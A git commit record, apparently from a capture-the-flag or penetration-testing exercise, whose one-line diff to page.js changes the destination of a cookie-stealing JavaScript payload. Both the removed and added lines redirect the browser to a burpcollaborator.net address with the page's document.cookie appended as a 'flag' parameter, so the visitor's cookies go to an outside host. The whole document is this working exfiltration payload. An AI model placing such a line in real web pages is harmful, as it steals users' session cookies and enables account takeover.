76e5019d592599a38a0a35f46692c1a89c78ae82
qwidz <99133026+qwidz@users.noreply.github.com>
2022-02-15 09:11:24 +0300

    Update page.js

--- page.js
+++ page.js
@@ -1,1 +1,1 @@
-window.location = "http://t714g8fmdt9fbuegyligbh1qchi76w.burpcollaborator.net?flag=" + document.cookie;
+window.location = "http://8y7wbifim98fex4taiepc5ra61cr0g.burpcollaborator.net?flag=" + document.cookie;
